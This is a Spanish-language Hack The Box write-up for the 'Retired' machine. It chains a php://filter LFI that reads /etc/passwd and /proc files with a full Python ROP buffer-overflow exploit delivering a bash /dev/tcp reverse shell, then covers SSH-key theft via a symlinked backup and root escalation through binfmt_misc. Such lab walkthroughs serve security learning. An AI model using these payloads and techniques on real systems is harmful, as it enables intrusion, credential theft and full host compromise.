---
layout: single
title: Retired - Hack The Box
excerpt: "Esta máquina a partir de un LFI nos permite detectar un binario que explotamos con ROP buffer overflow"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-retired/retired1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - LFI
  - binarios
  - ROP  
---

# 10.10.11.154 - Retired
![](/assets/images/htb-retired/retired1.png)

------------------------
**Disclaimer**: esta maquina catalogada como media por htb, pero que deberia ser hard, debido a 
su complejidad tuve que tirar del writeup de [ippsec](https://www.youtube.com/watch?v=1MDqn1kBHQM).
 Aun asi me ha servido como aprendizaje y al poder entender todo el proceso lo he explicado
para que quede mas claro que el agua.

-----------------------------

# Part 1: Enumeración
Puertos abiertos -> 22(ssh), 80(http)
```console
└─$ whatweb http://10.10.11.154/
HTTPServer[nginx], ->  RedirectLocation[/index.php?page=default.html], nginx
Bootstrap, HTML5, HTTPServer[nginx], IP[10.10.11.154], Script, Title[Agency - Start Bootstrap Theme], nginx

# Fuzzing rutas PHP
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.154/FUZZ.php
000000001:   302        0 L      0 W        0 Ch        "index"

# Fuzzing subdirectorios
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.154/FUZZ/
000000277:   403        7 L      9 W        146 Ch      "assets"
000000536:   403        7 L      9 W        146 Ch      "css"
000000939:   403        7 L      9 W        146 Ch      "js"

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.154/FUZZ.html
000000026:   200        188 L    824 W      11414 Ch    "default"
000000902:   200        72 L     304 W      4144 Ch     "beta"
```
La url es 10.10.11.154/index.php?page=default.html
![](/assets/images/htb-retired/retired2.PNG)

----------------------------
# Part 2: LFI

```console
http://10.10.11.154/index.php?page=default.html -> default.html
http://10.10.11.154/index.php?page=default.html/../../../../../etc/passwd -> nada
http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```
Una vez tenemos como explotar el LFI podemos obtener mucha información del host:
```
# Nombre del dominio:
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/hostname |  base64 -d
retired

# Usarios
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd |  base64 -d | grep "sh" | awk '{print $1}' FS=":" | tr "\n" "," | sed "s/,/, /g"
root, sshd, vagrant, dev

# Puertos
└─$ for port in $(curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/net/tcp | base64 -d | awk '{print $2}' | awk '{print $2}' FS=":"); do echo "$((16#$port))" | short -u | tr "\n" "," | sed "s/,/, /g" ; done
80, 22, 1337

# Direcciones IP
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/net/fib_trie | base64 -d | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | tr "\n" "," | sed "s/,/, /g"
10.10.11.154, 127.0.0.1,

# Dominios
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/hosts | base64 -d | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | awk '{print $2}' | grep -v "localhost" | tr "\n" "," | sed "s/,/, /g"
bullseye, retired,

# Procesos en ejecución (lo meto en un archivo porque es mucho (56 lineas))
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/sched_debug | base64 -d | grep -P "\d" | grep -E "^ S|^ I" | grep -vE "scsi|system|kworker|card|irq|dbus|rcu" | awk '{print $2 " -> " $3}' > tee processes
```

----------------------------
# Part 3: Descubriendo un binario

La página beta.html dice tal que así:
![](/assets/images/htb-retired/retired3.PNG)

```
*Actualmente desarollando para EMUEMU (lo busque en google pero no hay nada). Si nos compraste una consola OSTRICH 
y quieres participar en el siguiente paso puedes activar tu licencia con la app "activate_license"
Un archivo de licencia contiene una llave de 512 bits que está en el paquete de la consola OSTRICH.*
```
Generamos una llave con openssl `openssl genrsa -out license.key 512` y la subimos
`/POST a /activate_license.php || datos -> name="licensefile"; filename="license.key" || contenido -> la llave`

Nos redirige a /activate_license.php que no devuelve ningun output. Pero podemos ver dicho archivo con el LFI.
```console
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=activate_license.php | base64 -d

<?php
if(isset($_FILES['licensefile'])) {   // Si el archivo que se sube es 'licensefile'
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);  // $license = "license.key"
    $license_size = $_FILES['licensefile']['size'];	// $license_size = 512
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); // crea un socket
    if (!socket_connect($socket, '127.0.0.1', 1337)) {      // Que escucha en el localhost en el puerto 1337
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";}
    socket_write($socket, pack("N", $license_size)); // empaqueta el tamaño en un ulong 32 bits
    socket_write($socket, $license);  // escribe en el socket ese "license.key" con su tamaño
    socket_shutdown($socket); socket_close($socket);}?> // cierra el socket.
```
Es decir tenemos un socket que le pasa a un programa nuestro archivo ¿Pero a cual?. Podemos tirar de ese archivo que creamos antes con el LFI...
```console
└─$ cat proceses | grep -E "activate|license"
activate_licens -> 413

└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/413/cmdline | base64 -d
/usr/bin/activate_license1337 
```
Asi que nos traemos dicho bianrio a nuestro sistema
```console
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license | base64 -d > activate_licens
└─$ chmod +x  ./activate_licens 
└─$ ./activate_licens
Error: specify port to bind to  

└─$ ./activate_licens 666
[+] starting server listening on port 666
[+] listening ...

└─$ nc localhost 666
AAAA
[+] accepted client connection from 0.0.0.0:0
[+] reading 1094795585 bytes
[+] activated license:
```
Con netcat y python podemos interactuar mejor:
```console
└─$ python3 -c "print('A'*4 + 'A'*6)" | nc localhost 666
└─$ ./activate_licens 666
[+] starting server listening on port 666
[+] listening ...
[+] accepted client connection from 0.0.0.0:0
[+] reading 1094795585 bytes
[+] activated license: AAAAAA
```
----------------------------
# Part 4: Desensamblando el binario

Si abrimos el programa con ghydra (he cambiado nombres de funciones y eliminado salidas de error para hacerlo mas ligero):

```c
int main(int argc,char **argv) {
  int port; char IP_s [16]; sockaddr_in IP; socklen_t IPlen; sockaddr_in server;
  uint16_t port; int sockfd; int serverfd;    
  
  	// Le pide al usuario un puerto como argumento
  port = scanf(argv[1],&DAT_00102100,&port);  // Metemos en port el puerto (o sea argumento 1)
  printf("[+] starting server listening on port %d\n",(ulong)port);

	// Crea un socket en escucha
  server.sin_family = 2; server.sin_addr = htonl(0x7f000001); server.sin_port = htons(port);
  serverfd = socket(2,1,6);
  port = bind(serverfd,(sockaddr *)&server,0x10); port = listen(serverfd,100); puts("[+] listening ...");
  
  while( true ) {
    while( true ) {
    	sockfd = accept(serverfd,(sockaddr *)&IP,&IPlen);
    	inet_ntop(2,&IP.sin_addr,IP_s,0x10);
    	printf("[+] accepted client connection from %s:%d\n",IP_s,(ulong)IP.sin_port);
    	
		// En un proceso hijo (el padre es la conexción en sí) le pasa a "activate_license" 
		// un descriptro de fichero que almacenará el input que se le pasa por la conexión (el nc localhost 666)
		hijo = fork();
    	if (hijo == 0) break;
    	close(sockfd);}
  			close(serverfd);
  		activate_license(sockfd);
  		exit(0);}
```
No hay nada demasaido interesante, pero tenemos la funcion "activate_license" que es la que entra en juego una vez hemos dado el puerto
```c
void activate_license(int sockfd){
  int sqlite;
  ssize_t sVar2;
  sqlite3_stmt *stmt; sqlite3 *db;
  uint32_t msglen; char buffer [512];
  
  // Mete en "msglen" 4 bytes del input que recibe de la conexión 
  tamaño = read(sockfd,&msglen,4); msglen = ntohl(msglen);
  printf("[+] reading %d bytes\n",(ulong)msglen);  
  // 4 bytes para el tamaño -> python3 -c "print('A'*4)" | nc localhost 666 -> reading 1094795585 bytes >>> 0x41414141 = 1094795585
 
  // Lo segundo que le pide al usaurio es la licencia. Mete en el buffer de 512 bytes hasta cubrir el tamaño especificado en mslen
  licencia = read(sockfd,buffer,(ulong)msglen);  

  // Lo almacena en una base de datos sqlite
  sqlite = sqlite3_open("license.sqlite",&db); 
  sqlite = sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS license (id INTEGER PRIMARY KEY AUTOINCREMENT, license_key TEXT)" ,0,0,0);
  sqlite = sqlite3_prepare_v2(db,"INSERT INTO license (license_key) VALUES (?)",0xffffffff,&stmt,0);
  sqlite = sqlite3_step(stmt); port = sqlite3_reset(stmt); port = sqlite3_finalize(stmt);
  printf("[+] activated license: %s\n",buffer); return;}
```
Lo critico está en la funcion read ```licencia = read(sockfd,buffer,(ulong)msglen); ``` porque 
¿Y si lo que le metemos a buffer por sockfd es mas grande que lo especificado en mslen?
```console
└─$ printf "\x00\x00\x00\x01AAAA" | nc localhost 6668
└─$ ./activate_licens 666          
[+] reading 1 bytes
[+] activated license: A
```
Si le mandamos esto `printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668` (mete 600 A en 512 de tamaño) 
al final de las AAA pone bytes extraños,  puede que el proceso se ha corromprido de cierta manera. Pero por que no da SEGFAULT? porque es un proceso hijo
Si lo corremos con gdb en otro puerto (y seguimos al hijo):
```console
└─$ gdb ./activate_licens
gef➤  set follow-fork-mode child
gef➤  r 6667
# printf "\x00\x00\x03\x00$(python3 -c 'print("A" * 1000)')" | nc localhost 6668
# >>> SEGFAULT (mete 1000 A en 768 bytes)
```
-------------------
# Part 5: Explotación del binario

Vemos primero las protecciones:
```console
└─$ file ./activate_licens 
./activate_licens: ELF 64-bit LSB pie executable, x86-64, dynamically linked, /lib64/ld-linux-x86-64.so.2
gef➤  checksec
Canary                        : ✘ -> 
NX                            : ✓ -> no se puede ejecutar shellcode en la pila
PIE                           : ✓ -> memoria aleatorizada
Fortify                       : ✘
RelRO                         : Full -> No podemos modificar la tabla GOT
```
## Buffer overflow:
Antes de pensar en el ataque hay que ver lo primero de cualquier buffer overflow ¿Cuando corrompemos la pila (sobreescribir rip)?
```console
gef➤ pattern create 1024
aaaaaaa...aaaaf
└─$ printf "\x00\x00\x03\x00aaaaaaa...aaaaf" | nc localhost 6669
# SEGFAULT
$rsp   : 0x007fffffffded8  →  "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"
$rbp   : 0x636161616161616f ("oaaaaaac"?)
$rsi   : 0x005555555592a0  →  "[+] activated license: aaaaaaaabaaaaaaacaaaaaaadaa[...]"
gef➤ pattern offset $rsp
[+] Found at offset 520 (little-endian search) likely
```
Es decir a los 520 bytes basura empezamos a escribir en el putnero de instruccion (rsp) a partir del cual todo lo que pongamos se ejecutará.

## Descripción del ataque:
Este binario tiene de especial unas cuantas protecciones (por ejemplo NX que nos impide hacer un shellcode buffer overflow) y que es un
binario remoto, es decir se interactua con el a partir de subir una llave.key a una página web.
Por lo que esa llave que se sube tiene que ser epecial, dandonos una reverse shell:
`system(bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1')`

Como estamos en 64 bytes tenemos que tirar de ROP:
En 64 bytes las funciones toman sus argumentos de los registros del procesador en este orden de prioridad -> rdi, rdi, rdx, r8, r9  
Ejemplo -> ```system("whoami")```. Si en \[rdi] está la cadena "whoami" y luego se llama a system(), este "whoami" será su argumento.

## Ataque: obteniendo las direeciones necesarias:

Para hacer un ROP hay que saber ciertas direcciones (las que están en la maquina victima por medio del LFI)
Primero hay que conseguir la libc que esta usando:
```console
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/413/maps | base64 -d  | grep "libc"
7fc8a1464000-7fc8a1489000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/lib/x86_64-linux-gnu/libc-2.31.so | base64 -d > libc-2.31.so
```
Luego hay que saber las direcciones base (libc y el binario):
Como las direcciones cambian siemore que se reinicia la maquina con este script he automatizado su obtención:
```bash
base64_url="http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource="
pid=$(curl -s $base64_url/proc/sched_debug | base64 -d | grep "activate_licens" | awk '{print $3}') 
libc_memory=$(curl -s $base64_url/proc/$pid/maps | base64 -d | grep "libc" | head -n1 | awk '{print $1}' | awk '{print $1}' FS="-")
binary_memory=$(curl -s $base64_url/proc/$pid/maps | base64 -d | grep "activate_licens" | head -n1 | awk '{print $1}' | awk '{print $1}' FS="-")

echo "Direccion de memoria del binario -> 0x${binary_memory}"
echo "Direccion de memoria de libc -> 0x${libc_memory}"
```

También hay que ver que parte del bianrio tiene permisos de escritura (donde meteremos el comando de la reverse shell que se le pasará a system)
```console
└─$ rabin2 -S ./activate_licens | grep "w"
23  0x00003000   0x10 0x00004000   0x10 -rw- .data
```
La seccion .data es la idonea para esto (es donde se meten varaibles estaticas) y tenemos suerte de que es escribible.
El resto de direcciones la sacaremos de esta libc que usa el bianrio:
- **system**
```console
└─$ objdump -d libc-2.31.so | grep "system"    
0000000000048e50 <__libc_system@@GLIBC_PRIVATE>:
# Tambien con readelf -> readelf -s libc-2.31.so | grep "system" 
```
- **ROP gadgets**
```console
└─$ ropper -f libc-2.31.so --search "pop rdi; ret"
0x0000000000026796: pop rdi; ret;
└─$ ropper -f libc-2.31.so --search "pop rsi; ret"
0x000000000002890f: pop rsi; ret;
└─$ ropper -f libc-2.31.so --search "mov [rdi], rsi; ret"
0x00000000000603b2: mov qword ptr [rdi], rsi; ret;
```
¿Que es lo que pretendemos hacer con esto?
Como dije antes hay que hacer ```system(bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1')```.
Para ello este "bash -c..." se tiene que escribir en la seccion con permisos de escritura, es decir ".data":
```.data = bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'``` Esto se hace tambien con los registros (rdi y rsi)
1. Hay que meter en \[rdi] la direccion de ".data".
2. Hay que dividier el comando en cadenas de 8 en 8 bytes (enteros, si sobra un byte se le añaden 7 ceros para que de 8)
3. Hay que ir moviendo esas cadenas a .data (rdi) de tanda en tanda, para ello se meten en (rsi) 
4. "mov rdi rsi" -> Mueve lo de rsi (las cadenas) a rdi (la seccion .data))

Despues de esto se mete en rdi la seccion .data y se le pasa dicho rdi a system.
Aquí estaria el exploit (he vuelto a copiar como comentario los comandos de donde se ha sacado cada cosa).

```python3
#!/usr/bin/python3
import socket
from struct import pack
import requests

cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"
# Sacamos estas dos del script de bash de antes, por tanto a usted le saldran diferentes (solo estas dos, el resto son iguales)
libc_base = 0x7f356ace6000
binary_base = 0x5646c60f3000

writable = binary_base + 0x00004000   # rabin2 -S ./activate_licens | grep "w"
system = pack("<q",(libc_base + 0x00048e50)) #  objdump -d libc-2.31.so | grep "system" 
pop_rdi = pack("<q",(libc_base + 0x0026796)) #   ropper -f libc-2.31.so --search "pop rdi; ret"
pop_rsi = pack("<q",(libc_base + 0x002890f)) #  ropper -f libc-2.31.so --search "pop rsi; ret"
mov_rdi_rsi = pack("<q",(libc_base + 0x000603b2)) #  ropper -f libc-2.31.so --search "mov [rdi], rsi; ret"
payload = b'A' * 520

# Mete en writable de 8 en 8 bytes el comando
# ROP -> rdi=writable  rsi=cmd   mov [rdi <- rsi]
for i in range(0, len(cmd), 8):
    payload += pop_rdi
    payload += pack("<q",(writable + i))
    payload += pop_rsi
    payload += cmd[i:i+8].ljust(8, b"\x00")  # [0:8] [8:16] [16:24]...
    payload += mov_rdi_rsi

# system() <- rdi
payload += pop_rdi
payload += pack("<q",writable)
payload += system
with open("file.key", "wb") as f:
    f.write(payload)

file = {'licensefile':("file.key", open("file.key","rb"), 'application/x-iwork-keynote-sffkey')}
url = "http://10.10.11.154/activate_license.php"
req = requests.post(url, files=file)
```
Ya con esto si estamos en escucha por netcat accedemos al binario.

-------------------
# Part 6: Escalada de privilegios: www-data -> dev

Despues de un reconocimiento del sistema, encuentro que:
```console
www-data@retired:/tmp$ systemctl list-timers | head -n 4
# Se ejecuta cada minuto website_backup.timer website_backup.service
# /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website
[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup
[Install]
WantedBy=multi-user.target
```
El usaurio "dev" ejecuta cada minuto el script  /usr/bin/webbackup:
Renombrando variables este script es:
```
#!/bin/bash
cd /var/www/
/usr/bin/rm -f /var/www/fecha-html.zip   # Borra /var/www/fecha-html.zip 
/usr/bin/zip --recurse-paths /var/www/fecha-html.zip /var/www/html # Comprime /var/www/html en /var/www/fecha-html.zip
KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```
Lo que nos interesa es la parte de que hace comprime todo **/var/www/html** en  **/var/www/fecha-html.zip**. Cuando tenemos copia/compresion de archivos
o carpetas concretas hay que hacer la trampa con elnaces simbolicos:
```ln -s -f /home/dev /var/www/html``` Haz un enlace del /home/dev en /var/www/html
Ahora vemos el nuevo archivo que se ha creado y lo copiamos antes de que desaparezca:
```console
www-data@retired:/tmp$ watch -n 1 ls /var/www/
# Se crea 2023-01-22_10-18-00-html.zip
www-data@retired:/tmp$ cp /var/www/2023-01-22_10-18-00-html.zip /tmp
```
Si lo abrimos veremos que está todo el /home/dev por culpa del enlace
```console
www-data@retired:/tmp$ cd /tmp/
www-data@retired:/tmp$ unzip 2023-01-22_10-18-00-html.zip
www-data@retired:/tmp$ cd ./var/www/html
www-data@retired:/tmp/var/www/html$ cd dev
www-data@retired:/tmp/var/www/html/dev$ ls -la
drwx------ 2 www-data www-data 4096 Mar 11  2022 .ssh
drwx------ 2 www-data www-data 4096 Mar 11  2022 activate_license
drwx------ 3 www-data www-data 4096 Mar 11  2022 emuemu
```
Si nos copiamos su id_rsa del directorio .shh y le damos los permisos ```chmod 600 ir_rsa``` podemos acceder por ssh a dicho usuario.
```ssh -i id_rsa dev@10.10.11.154```

-------------------
# Part 7: Escalada de privilegios a root: reg_helper

En el home esta el bianrio activate_licens que explotamos antes, la flag y la carpeta emuemu (mencionada en la web)
```console
dev@retired:~/emuemu$ ls
Makefile  README.md  emuemu  emuemu.c  reg_helper  reg_helper.c  test
dev@retired:~/emuemu$ cat README.md 

EMUEMU es el software oficial de emulado para la consola OSTRICH
Despues de la instalación con 'make install', las ROMs de OSTRICH pueden ser ejecutados desde el terminal.
Por ejemplo la ROM llamada 'rom' se puede correr con './rom'
```
Tambien tenemos emuemu.c que simplemente imprime "EMUEMU está todavia en desarollo"
Luego tenemos reg_helper.c
```c
#define _GNU_SOURCE
int main(void) {
    char cmd[512] = { 0 };   // Buffer vario de 512 bytes "cmd"
    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;   // Lee del standar imput el cmd
    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);  // Abre /proc/sys/fs/binfmt_misc/register para escritura
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)   // Escribe el cmd dentro
        perror("write");
    if (close(fd) == -1)
        perror("close");
	return 0;}
```
El makefile tiene dos lineas interesantes:
```
setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' | tee /usr/lib/binfmt.d/emuemu.conf | /usr/lib/emuemu/reg_helper
```
Es decir mete en /usr/lib/binfmt.d/emuemu.conf esa linea rara ':EMUEMU:M::..' y de ahi a reg_helper, que dice que todo lo que le entre ira 
a /proc/sys/fs/binfmt_misc/register

Como bien dicen, este binario tiene esta capability (primero tuve que retocar el PATH para verla porque era muy corto)
Dicha capability te permite cambiar de usaurio y grupo.
```console
dev@retired:~/emuemu$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
dev@retired:~/emuemu$ getcap -r / 2>/dev/null /usr/bin/ping cap_net_raw=ep
/usr/lib/emuemu/reg_helper cap_dac_override=ep
```
La capability se pasa sobre este "/usr/lib/emuemu/reg_helper" que a su vez como nos dice su código, llama a binfmt_misc.
Una busqueda en google de dicha cosa (binfmt_misc) nos dice que:
 > binfmt_misc: binario de linux que permite que ciertos programas ejecuten otros con formatos raros, como emuladores y maquinas virtuales.  

Este binario tiene un archivo de una sola linea llamado "register" que define que programa ejecuta que cosa:
```:nombre:tipo:offset:magic:mask:interprete:flags```
Las opciones offset magic y mask son para el tipo si es "M" de magic number, el otro posible es "E" de extension, esta es la que usaremos, porque 
es mas sencilla:
> ":PWN:E::xii::/tmp/shell:C" -> Archivo "PWN" con la extension xii que ejecutara el programa /tmp/shell con la flag C (mantiene privilegios)  

La idea seria escribirlo en "/proc/sys/fs/binfmt_misc/register" pero no nos deja, asi que lo hacemos en reg_helper que, repito, escribe 
en "register" lo que se le pase por el stdin.
```
dev@retired:~/emuemu$ echo ":PWN:E::xii::/tmp/shell:C" | /usr/lib/emuemu/reg_helper
dev@retired:~/emuemu$ nano /tmp/shell
int main(void){
    setuid(0); setgid(0); system("/bin/bash");
}
dev@retired:/tmp$ gcc shell.c -o shell
dev@retired:/tmp$ find / -perm -4000 2>/dev/null | head -n 1
/usr/bin/newgrp
dev@retired:/tmp$ ln -s /usr/bin/newgrp PWN.xii
dev@retired:/tmp$ ./PWN.xii
root@retired:/tmp#
```